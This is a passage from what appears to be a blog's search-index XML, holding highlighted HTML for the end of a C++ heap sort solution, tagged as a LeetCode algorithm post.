keyword">int</span><span class="token operator">></span> <span class="token function">heapSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token number">-1</span><span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">adjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 编程算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> leetcode </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
